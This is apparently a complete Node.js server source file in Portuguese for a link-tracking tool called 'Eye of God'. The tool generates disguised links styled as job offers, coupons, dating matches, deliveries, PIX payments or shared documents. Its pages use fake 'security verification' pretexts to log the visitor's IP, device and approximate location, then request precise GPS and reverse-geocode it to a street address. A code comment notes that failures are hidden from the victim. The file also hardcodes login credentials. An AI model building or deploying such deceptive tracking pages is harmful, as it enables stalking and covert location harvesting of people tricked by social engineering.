require('dotenv').config();
const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const cookieParser = require('cookie-parser');

// Inicializar aplicação Express
const app = express();
const PORT = process.env.PORT || 3000;
const isProduction = process.env.NODE_ENV === 'production';

// Middleware
app.use(cors());
app.use(morgan(isProduction ? 'combined' : 'dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Autenticação básica
const CREDENTIALS = {
  username: 'juliodev',
  password: 'juliodev.tech'
};

// Middleware de autenticação
function requireAuth(req, res, next) {
  // Verificar token de autenticação no cookie ou query parameter
  const authToken = req.query.token || req.cookies?.authToken;
  
  // Bypass para a página de login e a API de login
  if (req.path === '/login' || req.path === '/api/login') {
    return next();
  }
  
  // Verificar se é uma rota de rastreamento (estas devem permanecer públicas)
  if (req.path.startsWith('/t/') || 
      req.path.startsWith('/s/') || 
      req.path.startsWith('/l/') ||
      req.path.startsWith('/api/update-location') ||
      req.path.startsWith('/vagas/') ||
      req.path.startsWith('/cupom/') ||
      req.path.startsWith('/eventos/') ||
      req.path.startsWith('/match/') ||
      req.path.startsWith('/entrega/') ||
      req.path.startsWith('/pagamento/') ||
      req.path.startsWith('/drive/') ||
      req.path.startsWith('/docs/') ||
      req.path.startsWith('/photos/')) {
    return next();
  }
  
  // Para todas as outras rotas, exigir autenticação
  if (!authToken || authToken !== 'eyeofgod-juliodev-auth') {
    return res.redirect('/login?redirect=' + encodeURIComponent(req.originalUrl));
  }
  
  next();
}

// Aplicar middleware de autenticação a todas as rotas
app.use(requireAuth);

// Base de dados em arquivo
const DB_PATH = path.join(__dirname, 'db.json');

// Inicializar banco de dados se não existir
if (!fs.existsSync(DB_PATH)) {
  fs.writeFileSync(DB_PATH, JSON.stringify({ links: {}, traces: {} }));
}

// Funções auxiliares
function readDB() {
  return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
}

function writeDB(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

// Lista de palavras para gerar URLs amigáveis
const adjectives = ['seguro', 'rapido', 'privado', 'oficial', 'novo', 'premium', 'facil', 'digital', 'smart', 'social', 'web', 'mega'];
const nouns = ['acesso', 'link', 'portal', 'entrada', 'site', 'pagina', 'plataforma', 'app', 'caminho', 'conta', 'perfil', 'docs'];
const domains = ['online', 'web', 'app', 'site', 'info', 'me', 'net', 'link', 'click', 'go', 'now', 'page'];

// Templates para diferentes tipos de links
const linkTemplates = {
  "default": {
    slugPrefix: "link",
    maskStyle: "default",
    pageTitle: "Verificação de Segurança",
    logo: "shield-alt",
    primaryColor: "#3498db",
    message: "Por proteção contra fraudes e phishing, precisamos verificar sua região. Esta verificação rápida ajuda a proteger você e outras pessoas."
  },
  "emprego": {
    slugPrefix: "vaga",
    maskStyle: "job",
    pageTitle: "Verificação de Candidatura",
    logo: "briefcase",
    primaryColor: "#0e76a8",
    message: "Para verificarmos as vagas disponíveis na sua região, precisamos confirmar sua localização atual."
  },
  "cupom": {
    slugPrefix: "promo",
    maskStyle: "discount",
    pageTitle: "Ativação de Cupom",
    logo: "tag",
    primaryColor: "#e74c3c",
    message: "Para ativar este cupom exclusivo na loja mais próxima, confirme sua localização atual."
  },
  "evento": {
    slugPrefix: "evento",
    maskStyle: "event",
    pageTitle: "Convite Exclusivo",
    logo: "calendar-check",
    primaryColor: "#9b59b6",
    message: "Para confirmar sua presença neste evento local, precisamos verificar sua região."
  },
  "namoro": {
    slugPrefix: "match",
    maskStyle: "dating",
    pageTitle: "Novo Match Próximo",
    logo: "heart",
    primaryColor: "#e84393",
    message: "Alguém próximo a você mostrou interesse. Compartilhe sua localização para ver quem é."
  },
  "entrega": {
    slugPrefix: "delivery",
    maskStyle: "delivery",
    pageTitle: "Confirmar Entrega",
    logo: "shipping-fast",
    primaryColor: "#3498db",
    message: "Para garantir a entrega correta no endereço certo, confirme sua localização atual."
  },
  "pagamento": {
    slugPrefix: "pix",
    maskStyle: "payment",
    pageTitle: "Confirmar Transação",
    logo: "money-bill-wave",
    primaryColor: "#2ecc71",
    message: "Para finalizar esta transação com segurança, precisamos confirmar que você está em uma região autorizada."
  }
};

// Gerar um slug amigável para o link, usando o prefixo do template correspondente
function generateFriendlySlug(templateType = 'default') {
  const template = linkTemplates[templateType] || linkTemplates.default;
  const slugPrefix = template.slugPrefix;
  const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
  const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
  const randomNumber = Math.floor(Math.random() * 1000);
  
  return `${slugPrefix}-${randomAdjective}-${randomNoun}-${randomNumber}`;
}

// Gerar URLs mascaradas que parecem legítimas, adaptadas ao tipo de template
function generateMaskedUrl(req, linkId, templateType = 'default', customMask = null) {
  const host = req.headers.host;
  const protocol = req.protocol;
  const baseUrl = `${protocol}://${host}`;
  
  // Se tem uma máscara personalizada, usá-la
  if (customMask && customMask.trim() !== '') {
    // Verificar se a máscara já tem um protocolo (http/https)
    if (customMask.startsWith('http://') || customMask.startsWith('https://')) {
      return customMask;
    } else {
      // Adicionar https:// como padrão se não tiver
      return `https://${customMask}`;
    }
  }
  
  // Obter o template correspondente
  const template = linkTemplates[templateType] || linkTemplates.default;
  
  // Caso contrário, usar os estilos predefinidos com base no template
  switch (template.maskStyle) {
    case 'job':
      return `${baseUrl}/vagas/oportunidade/${generateFriendlySlug(templateType)}`;
    case 'discount':
      return `${baseUrl}/cupom/desconto/${generateFriendlySlug(templateType)}`;
    case 'event':
      return `${baseUrl}/eventos/convite/${generateFriendlySlug(templateType)}`;
    case 'dating':
      return `${baseUrl}/match/perfil/${generateFriendlySlug(templateType)}`;
    case 'delivery':
      return `${baseUrl}/entrega/pedido/${generateFriendlySlug(templateType)}`;
    case 'payment':
      return `${baseUrl}/pagamento/confirmar/${generateFriendlySlug(templateType)}`;
    case 'google':
      return `${baseUrl}/drive/document/view/${linkId}`;
    case 'document':
      return `${baseUrl}/docs/shared/document/${linkId}/view`;
    case 'photo':
      return `${baseUrl}/photos/album/shared/${linkId}`;
    case 'friendly':
      const friendlySlug = generateFriendlySlug(templateType);
      return `${baseUrl}/s/${friendlySlug}`;
    case 'short':
      // Gera uma ID curta alfanumérica de 5-7 caracteres
      const shortId = linkId.substring(0, 6);
      return `${baseUrl}/l/${shortId}`;
    default:
      return `${baseUrl}/t/${linkId}`;
  }
}

// Função para obter o IP real do cliente
function getRealIP(req) {
  // Ordem de prioridade para headers que contêm o IP real
  const headers = [
    'x-forwarded-for',
    'x-real-ip',
    'cf-connecting-ip', // Cloudflare
    'true-client-ip',   // Akamai
    'x-client-ip',
    'forwarded',
  ];
  
  for (const header of headers) {
    const value = req.headers[header];
    if (value) {
      // Muitos desses headers podem conter múltiplos IPs separados por vírgula
      // O primeiro IP normalmente é o do cliente real
      const ips = value.split(',').map(ip => ip.trim());
      if (ips[0]) {
        return ips[0];
      }
    }
  }
  
  // Se não encontrar em nenhum header, use o IP padrão da requisição
  return req.ip;
}

// Obter informações do IP
async function getIPInfo(ip) {
  try {
    // Limpar o IP para remover o prefixo IPv6
    let cleanIp = ip;
    if (ip.includes('::ffff:')) {
      cleanIp = ip.replace('::ffff:', '');
    }
    
    // Se for localhost ou IP privado, usamos um IP público para simulação
    if (cleanIp === '::1' || cleanIp === '127.0.0.1' || 
        cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.') || 
        cleanIp.startsWith('172.16.') || cleanIp.startsWith('172.17.') || 
        cleanIp.startsWith('172.18.') || cleanIp.startsWith('172.19.') || 
        cleanIp.startsWith('172.2') || cleanIp.startsWith('172.3') || 
        cleanIp.startsWith('169.254.')) {
      return {
        ip: cleanIp,
        location: 'Local (Simulado)',
        isp: 'Local Network',
        asn: 'N/A',
        org: 'Local Network',
        coordinates: null
      };
    }
    
    // API #0: Tentar obter coordenadas diretas via abstractapi.com
    try {
      const apiKey = process.env.ABSTRACTAPI_KEY || ''; // Recomendável adicionar no .env
      if (apiKey) {
        const response = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${apiKey}&ip_address=${cleanIp}`);
        const data = await response.json();
        
        if (data && data.latitude && data.longitude) {
          return {
            ip: cleanIp,
            location: `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.replace(', ,', ','),
            isp: data.connection.isp || 'Desconhecido',
            asn: data.connection.autonomous_system_number || 'Desconhecido',
            org: data.connection.autonomous_system_organization || 'Desconhecido',
            coordinates: {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: 'alta'
            },
            // Dados extras
            timezone: data.timezone ? data.timezone.name : null,
            currency: data.currency ? data.currency.currency_name : null,
            continent: data.continent || null
          };
        }
      }
    } catch (error) {
      console.log('Falha na API de geolocalização direta:', error.message);
    }
    
    // Tentar primeira API: ipapi.co
    try {
      const response = await fetch(`https://ipapi.co/${cleanIp}/json/`);
      const data = await response.json();
      
      if (!data.error && data.city && data.country_name) {
        return {
          ip: cleanIp,
          location: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(', ,', ','),
          isp: data.org || 'Desconhecido',
          asn: data.asn || 'Desconhecido',
          org: data.org || 'Desconhecido',
          coordinates: data.latitude && data.longitude ? {
            latitude: data.latitude,
            longitude: data.longitude,
            accuracy: 'média'
          } : null,
          timezone: data.timezone || null,
          currency: data.currency || null
        };
      }
    } catch (error) {
      console.log('Falha na primeira API de geolocalização:', error.message);
    }
    
    // Tentar segunda API: ipinfo.io
    try {
      const response = await fetch(`https://ipinfo.io/${cleanIp}/json`);
      const data = await response.json();
      
      if (data && !data.error && data.city && data.country) {
        // ipinfo.io retorna coordenadas como "lat,lon"
        let coordinates = null;
        if (data.loc) {
          const [latitude, longitude] = data.loc.split(',');
          if (latitude && longitude) {
            coordinates = {
              latitude: parseFloat(latitude),
              longitude: parseFloat(longitude),
              accuracy: 'média'
            };
          }
        }
        
        return {
          ip: cleanIp,
          location: `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.replace(', ,', ','),
          isp: data.org || 'Desconhecido',
          asn: data.org ? data.org.split(' ')[0] : 'Desconhecido',
          org: data.org ? data.org.split(' ').slice(1).join(' ') : 'Desconhecido',
          coordinates: coordinates,
          timezone: data.timezone || null
        };
      }
    } catch (error) {
      console.log('Falha na segunda API de geolocalização:', error.message);
    }
    
    // Tentar terceira API: ip-api.com (HTTP apenas, use com cautela)
    try {
      const response = await fetch(`http://ip-api.com/json/${cleanIp}`);
      const data = await response.json();
      
      if (data && data.status === 'success') {
        return {
          ip: cleanIp,
          location: `${data.city || ''}, ${data.regionName || ''}, ${data.country || ''}`.replace(', ,', ','),
          isp: data.isp || 'Desconhecido',
          asn: data.as || 'Desconhecido',
          org: data.org || 'Desconhecido',
          coordinates: data.lat && data.lon ? {
            latitude: data.lat,
            longitude: data.lon,
            accuracy: 'média'
          } : null,
          timezone: data.timezone || null
        };
      }
    } catch (error) {
      console.log('Falha na terceira API de geolocalização:', error.message);
    }
    
    // Tentar quarta API: geolocation-db.com (opção de backup)
    try {
      const response = await fetch(`https://geolocation-db.com/json/${cleanIp}`);
      const data = await response.json();
      
      if (data && data.country_name) {
        return {
          ip: cleanIp,
          location: `${data.city || ''}, ${data.state || ''}, ${data.country_name || ''}`.replace(', ,', ','),
          isp: 'Desconhecido',
          asn: 'Desconhecido',
          org: 'Desconhecido',
          coordinates: data.latitude && data.longitude ? {
            latitude: data.latitude,
            longitude: data.longitude,
            accuracy: 'baixa'
          } : null
        };
      }
    } catch (error) {
      console.log('Falha na quarta API de geolocalização:', error.message);
    }
    
    // Se todas as APIs falharem, use dados básicos baseados no país pelo código IP
    // Esta é uma solução de último recurso usando dados locais
    try {
      // Identificar país pelo primeiro octeto do IP (muito básico)
      const ipFirstOctet = parseInt(cleanIp.split('.')[0]);
      let location = 'Desconhecido';
      let coordinates = null;
      
      // Mapeamento muito básico de alguns intervalos comuns
      if (ipFirstOctet >= 186 && ipFirstOctet <= 189) {
        location = 'Brasil';
        coordinates = {
          latitude: -15.7801, // Coordenadas aproximadas do centro do Brasil
          longitude: -47.9292,
          accuracy: 'muito baixa'
        };
      } else if (ipFirstOctet >= 72 && ipFirstOctet <= 79) {
        location = 'Estados Unidos';
        coordinates = {
          latitude: 37.0902,  // Coordenadas aproximadas do centro dos EUA
          longitude: -95.7129,
          accuracy: 'muito baixa'
        };
      } else if (ipFirstOctet >= 81 && ipFirstOctet <= 91) {
        location = 'Europa';
        coordinates = {
          latitude: 48.8566,  // Coordenadas aproximadas do centro da Europa
          longitude: 2.3522,
          accuracy: 'muito baixa'
        };
      }
      
      return {
        ip: cleanIp,
        location: location !== 'Desconhecido' ? location : 'Localização não identificada',
        isp: 'Desconhecido',
        asn: 'Desconhecido',
        org: 'Desconhecido',
        coordinates: coordinates
      };
    } catch (e) {
      // Se até isso falhar, retorne desconhecido
      return {
        ip: cleanIp,
        location: 'Localização não identificada',
        isp: 'Desconhecido',
        asn: 'Desconhecido',
        org: 'Desconhecido',
        coordinates: null
      };
    }
  } catch (error) {
    console.error('Erro ao obter informações do IP:', error);
    return {
      ip: ip,
      location: 'Erro na obtenção de dados',
      isp: 'Desconhecido',
      asn: 'Desconhecido',
      org: 'Desconhecido',
      coordinates: null
    };
  }
}

// Rotas
// Página inicial
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Gerar novo link
app.post('/api/generate-link', async (req, res) => {
  const { targetUrl, maskStyle, customMask, templateType } = req.body;
  
  if (!targetUrl) {
    return res.status(400).json({ error: 'URL de destino é necessária' });
  }
  
  // Gerar um ID único para este link
  const linkId = uuidv4();
  const db = readDB();
  
  // Selecionar estilo de máscara (padrão ou especificado pelo usuário)
  const style = maskStyle || 'default';
  
  // Selecionar tipo de template (padrão ou especificado pelo usuário)
  const template = templateType || 'default';
  
  // Gerar um slug amigável se for estilo 'friendly'
  let friendlySlug = null;
  if (style === 'friendly') {
    friendlySlug = generateFriendlySlug(template);
  } else if (style === 'short') {
    friendlySlug = linkId.substring(0, 6);
  }
  
  // Armazenar informações do link
  db.links[linkId] = {
    id: linkId,
    targetUrl,
    createdAt: new Date().toISOString(),
    createdBy: getRealIP(req),
    maskStyle: style,
    templateType: template,
    friendlySlug,
    customMask: customMask || null
  };
  
  // Inicializar o histórico de rastreamento para este link
  db.traces[linkId] = [];
  
  writeDB(db);
  
  // Gerar o link mascarado apropriado
  const trackingLink = generateMaskedUrl(req, linkId, template, customMask);
  
  res.json({
    success: true,
    linkId,
    trackingLink,
    shortLink: trackingLink,
    originalUrl: targetUrl,
    maskStyle: style,
    templateType: template
  });
});

// Adicionar rotas para os novos tipos de links
app.get('/vagas/oportunidade/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'emprego'));
app.get('/cupom/desconto/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'cupom'));
app.get('/eventos/convite/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'evento'));
app.get('/match/perfil/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'namoro'));
app.get('/entrega/pedido/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'entrega'));
app.get('/pagamento/confirmar/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'pagamento'));

// Rotas para links mascarados
app.get('/drive/document/view/:linkId', handleMaskedRedirect);
app.get('/docs/shared/document/:linkId/view', handleMaskedRedirect);
app.get('/photos/album/shared/:linkId', handleMaskedRedirect);
app.get('/payment/invoice/:linkId/secure', handleMaskedRedirect);
app.get('/account/login/confirm/:linkId', handleMaskedRedirect);

// Rota para links curtos
app.get('/l/:shortId', (req, res) => {
  const { shortId } = req.params;
  const db = readDB();
  
  // Encontrar o link pelo ID curto
  const linkId = Object.keys(db.links).find(id => id.startsWith(shortId));
  
  if (!linkId) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Redirecionar para a rota principal de tracking
  res.redirect(`/t/${linkId}`);
});

// Rota para links amigáveis
app.get('/s/:friendlySlug', (req, res) => {
  const { friendlySlug } = req.params;
  const db = readDB();
  
  // Encontrar o link pelo slug amigável
  const linkId = Object.keys(db.links).find(id => 
    db.links[id].friendlySlug === friendlySlug
  );
  
  if (!linkId) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Redirecionar para a rota principal de tracking
  res.redirect(`/t/${linkId}`);
});

// Função que lida com redirecionamento de URLs mascaradas
function handleMaskedRedirect(req, res) {
  const linkId = req.params.linkId;
  const db = readDB();
  
  if (!db.links[linkId]) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Redirecionar para a rota principal de tracking
  res.redirect(`/t/${linkId}`);
}

// Redirecionamento e rastreamento
app.get('/t/:linkId', async (req, res) => {
  const { linkId } = req.params;
  const db = readDB();
  
  // Verificar se o link existe
  if (!db.links[linkId]) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Coletar informações de rastreamento
  const userAgent = req.get('User-Agent');
  const realIP = getRealIP(req);
  const ipInfo = await getIPInfo(realIP);
  const timestamp = new Date().toISOString();
  
  // Criar ID único para este acesso
  const accessId = uuidv4();
  
  // Adicionar à lista de rastreamentos
  db.traces[linkId].push({
    timestamp,
    ip: realIP,
    ipInfo,
    userAgent,
    referer: req.get('Referer') || 'Direto',
    accessId, // ID único para este acesso
    preciseLocation: null // Será atualizado se o usuário permitir geolocalização
  });
  
  writeDB(db);
  
  // Obter o tipo de template para este link (ou usar o padrão)
  const templateType = db.links[linkId].templateType || 'default';
  const template = linkTemplates[templateType] || linkTemplates.default;
  
  // Em vez de redirecionar diretamente, mostrar uma página intermediária que solicita permissão de localização
  const html = `
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${template.pageTitle}</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
      :root {
        --primary-color: ${template.primaryColor};
      }
      body {
        font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        background-color: #fafafa;
        color: #333;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .container {
        max-width: 450px;
        background: #fff;
        box-shadow: 0 1px 3px rgba(0,0,0,0.08);
        border-radius: 6px;
        padding: 30px;
      }
      .logo {
        text-align: center;
        margin-bottom: 20px;
        color: var(--primary-color);
        font-size: 40px;
      }
      h1 {
        color: #2c3e50;
        margin-top: 0;
        font-size: 22px;
        text-align: center;
        margin-bottom: 8px;
      }
      .subtitle {
        color: #34495e;
        font-size: 16px;
        margin-bottom: 25px;
        text-align: center;
      }
      p {
        line-height: 1.6;
        margin-bottom: 20px;
        color: #555;
      }
      .redirect-button {
        background-color: var(--primary-color);
        color: white;
        border: none;
        padding: 14px 30px;
        border-radius: 30px;
        cursor: pointer;
        font-size: 16px;
        font-weight: 500;
        transition: all 0.3s;
        text-decoration: none;
        display: inline-block;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        width: 80%;
        margin: 0 auto;
      }
      .redirect-button:hover {
        opacity: 0.9;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      }
      .loader {
        border: 5px solid #f3f3f3;
        border-top: 5px solid var(--primary-color);
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
        display: none;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .security-badge {
        background-color: #f8f9fa;
        border-radius: 8px;
        padding: 15px;
        margin: 20px 0;
        display: flex;
        align-items: center;
        text-align: left;
        border-left: 4px solid var(--primary-color);
      }
      .security-badge i {
        font-size: 24px;
        color: var(--primary-color);
        margin-right: 15px;
      }
      .security-badge p {
        margin: 0;
        font-size: 14px;
      }
      .trust-indicators {
        display: flex;
        justify-content: center;
        margin-top: 20px;
        gap: 15px;
      }
      .trust-indicator {
        display: flex;
        align-items: center;
        font-size: 14px;
        color: #555;
      }
      .trust-indicator i {
        color: #4CAF50;
        margin-right: 5px;
      }
      .countdown {
        font-size: 14px;
        color: #666;
        margin-top: 15px;
        text-align: center;
      }
      .destination {
        background-color: #f5f5f5;
        padding: 10px;
        border-radius: 4px;
        font-size: 14px;
        color: #666;
        margin: 15px auto;
        max-width: 90%;
        word-break: break-all;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="logo">
        <i class="fas fa-${template.logo}"></i>
      </div>
      <h1>${template.pageTitle}</h1>
      <p class="subtitle">Garantimos segurança e privacidade</p>
      
      <div class="security-badge">
        <i class="fas fa-lock"></i>
        <p>${template.message}</p>
      </div>
      
      <p>Estamos verificando seu acesso antes de redirecioná-lo para:</p>
      <div class="destination">${db.links[linkId].targetUrl}</div>
      
      <div id="loader" class="loader"></div>
      
      <button id="redirectButton" class="redirect-button">
        <i class="fas fa-check-circle"></i> Verificar e Continuar
      </button>
      
      <div class="countdown" id="countdown">Redirecionamento automático em <span id="timer">10</span> segundos...</div>
      
      <div class="trust-indicators">
        <div class="trust-indicator">
          <i class="fas fa-check-circle"></i> Seguro
        </div>
        <div class="trust-indicator">
          <i class="fas fa-user-shield"></i> Privado
        </div>
        <div class="trust-indicator">
          <i class="fas fa-bolt"></i> Rápido
        </div>
      </div>
    </div>
    
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const redirectButton = document.getElementById('redirectButton');
        const loader = document.getElementById('loader');
        const countdown = document.getElementById('countdown');
        const timer = document.getElementById('timer');
        const accessId = '${accessId}';
        const linkId = '${linkId}';
        const targetUrl = '${db.links[linkId].targetUrl}';
        let secondsLeft = 10;
        let countdownInterval;
        
        // Iniciar contagem regressiva
        countdownInterval = setInterval(function() {
          secondsLeft--;
          timer.textContent = secondsLeft;
          
          if (secondsLeft <= 0) {
            clearInterval(countdownInterval);
            requestLocationAndRedirect();
          }
        }, 1000);
        
        // Função para solicitar localização e redirecionar
        function requestLocationAndRedirect() {
          loader.style.display = 'block';
          redirectButton.style.display = 'none';
          countdown.style.display = 'none';
          
          // Tentar obter a localização precisa
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              // Sucesso
              function(position) {
                const preciseLocation = {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude,
                  altitudeAccuracy: position.coords.altitudeAccuracy,
                  heading: position.coords.heading,
                  speed: position.coords.speed,
                  timestamp: position.timestamp
                };
                
                // Enviar localização para o servidor
                fetch('/api/update-location', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                    linkId,
                    accessId,
                    preciseLocation
                  })
                })
                .finally(() => {
                  // Redirecionar para o destino após 1 segundo
                  setTimeout(() => {
                    window.location.href = targetUrl;
                  }, 1000);
                });
              },
              // Erro
              function(error) {
                console.log('Erro ao obter localização:', error.message);
                // Mesmo sem localização, continuamos o redirecionamento após breve espera
                // para que o usuário não perceba que o erro ocorreu
                setTimeout(() => {
                  window.location.href = targetUrl;
                }, 1500);
              },
              // Opções
              {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
              }
            );
          } else {
            // Navegador não suporta geolocalização
            setTimeout(() => {
              window.location.href = targetUrl;
            }, 1500);
          }
        }
        
        // Evento do botão
        redirectButton.addEventListener('click', function() {
          clearInterval(countdownInterval);
          requestLocationAndRedirect();
        });
      });
    </script>
  </body>
  </html>
  `;
  
  res.send(html);
});

// Nova rota para atualizar a localização precisa
app.post('/api/update-location', (req, res) => {
  const { linkId, accessId, preciseLocation } = req.body;
  
  if (!linkId || !accessId || !preciseLocation) {
    return res.status(400).json({ error: 'Parâmetros incompletos' });
  }
  
  try {
    const db = readDB();
    
    // Verificar se o link existe
    if (!db.links[linkId]) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }
    
    // Encontrar o acesso específico e atualizar a localização
    const accessIndex = db.traces[linkId].findIndex(trace => trace.accessId === accessId);
    
    if (accessIndex !== -1) {
      db.traces[linkId][accessIndex].preciseLocation = preciseLocation;
      
      // Também podemos obter informações adicionais usando as coordenadas
      if (preciseLocation.latitude && preciseLocation.longitude) {
        // Iniciar uma tarefa em background para obter detalhes do local
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.latitude}&lon=${preciseLocation.longitude}&zoom=18&addressdetails=1`)
          .then(response => response.json())
          .then(data => {
            if (data && data.address) {
              db.traces[linkId][accessIndex].addressDetails = {
                road: data.address.road || null,
                house_number: data.address.house_number || null,
                neighbourhood: data.address.neighbourhood || data.address.suburb || null,
                city: data.address.city || data.address.town || data.address.village || null,
                state: data.address.state || null,
                country: data.address.country || null,
                postcode: data.address.postcode || null,
                formatted: data.display_name || null
              };
              
              writeDB(db);
            }
          })
          .catch(err => {
            console.error('Erro ao obter detalhes do endereço:', err);
          });
      }
      
      writeDB(db);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro ao atualizar localização:', error);
    res.status(500).json({ error: 'Erro ao processar solicitação' });
  }
});

// Obter informações de rastreamento de um link
app.get('/api/track/:linkId', (req, res) => {
  const { linkId } = req.params;
  const db = readDB();
  
  // Verificar se o link existe
  if (!db.links[linkId]) {
    return res.status(404).json({ error: 'Link não encontrado' });
  }
  
  // Retornar informações do link e seu histórico de rastreamento
  res.json({
    link: db.links[linkId],
    traces: db.traces[linkId] || []
  });
});

// Página de informações do link
app.get('/info/:linkId', (req, res) => {
  const { linkId } = req.params;
  const db = readDB();
  
  // Verificar se o link existe
  if (!db.links[linkId]) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Construir HTML para exibir informações
  const link = db.links[linkId];
  const traces = db.traces[linkId] || [];
  
  const html = `
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eye of God - Rastreamento de Link</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        line-height: 1.6;
        margin: 0;
        padding: 0;
        color: #333;
        background-color: #f0f2f5;
      }
      .container {
        max-width: 1200px;
        margin: 20px auto;
        background: white;
        padding: 25px;
        border-radius: 12px;
        box-shadow: 0 0 20px rgba(0,0,0,0.05);
      }
      .header {
        background: linear-gradient(135deg, #2c3e50, #3498db);
        color: white;
        padding: 25px;
        border-radius: 8px;
        margin-bottom: 30px;
        position: relative;
        overflow: hidden;
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      }
      .header::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: url('https://www.transparenttextures.com/patterns/cubes.png');
        opacity: 0.1;
      }
      h1 {
        margin: 0;
        padding-bottom: 5px;
        font-size: 2.2em;
        position: relative;
      }
      .subtitle {
        opacity: 0.9;
        margin: 5px 0 0;
      }
      .dashboard-container {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin-bottom: 30px;
      }
      .main-panel {
        flex: 2;
        min-width: 300px;
      }
      .side-panel {
        flex: 1;
        min-width: 300px;
      }
      .card {
        background: white;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0,0,0,0.05);
        padding: 20px;
        margin-bottom: 20px;
        border-top: 5px solid #3498db;
      }
      .card-header {
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 1px solid #eee;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .card-title {
        font-size: 1.2em;
        color: #2c3e50;
        margin: 0;
        display: flex;
        align-items: center;
        gap: 10px;
      }
      .link-info {
        background-color: white;
        padding: 20px;
        border-radius: 10px;
        margin-bottom: 30px;
        box-shadow: 0 0 15px rgba(0,0,0,0.05);
      }
      .tabs {
        display: flex;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .tab {
        padding: 10px 20px;
        cursor: pointer;
        border-bottom: 3px solid transparent;
        color: #7f8c8d;
        font-weight: 500;
        transition: all 0.3s;
      }
      .tab.active {
        border-bottom: 3px solid #3498db;
        color: #3498db;
      }
      .tab-content {
        display: none;
      }
      .tab-content.active {
        display: block;
      }
      .trace-item {
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 20px;
        background-color: white;
        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        transition: transform 0.2s;
      }
      .trace-item:hover {
        transform: translateY(-3px);
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      }
      .trace-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 1px solid #eee;
      }
      .trace-time {
        color: #7f8c8d;
        font-size: 0.9em;
      }
      .trace-details {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
      }
      .trace-details-col {
        flex: 1;
        min-width: 250px;
      }
      .trace-details p {
        margin: 8px 0;
      }
      .no-traces {
        color: #95a5a6;
        font-style: italic;
        padding: 20px;
        text-align: center;
        background: #f8f9fa;
        border-radius: 8px;
      }
      .action-buttons {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
      }
      .btn {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background-color: #3498db;
        color: white;
        padding: 10px 15px;
        text-decoration: none;
        border-radius: 6px;
